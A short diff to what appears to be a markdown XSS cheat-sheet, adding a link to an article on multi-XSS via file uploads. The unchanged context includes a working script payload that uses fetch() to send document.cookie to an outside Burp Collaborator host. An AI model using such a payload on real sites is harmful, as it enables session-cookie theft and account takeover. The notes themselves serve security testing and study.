@@ -7,6 +7,9 @@
 ## Exfiltrate cookie:
 <script>fetch('https://anmol.burpcollaborator.net?'+document.cookie, {method: 'POST',mode: 'no-cors',body:document.cookie});alert('exfiltrated the document.cookie');</script>
 
+## Multi XSS Exploit in Upload File
+1. <a href="https://systemweakness.com/multi-xss-exploit-in-upload-file-2bfde6ce471a">Multi XSS Exploit in Upload File</a>
+
 ## Tiny XSS
 1. <a href="https://tinyxss.terjanq.me/">Tiny XSS by @terjanq</a>
 
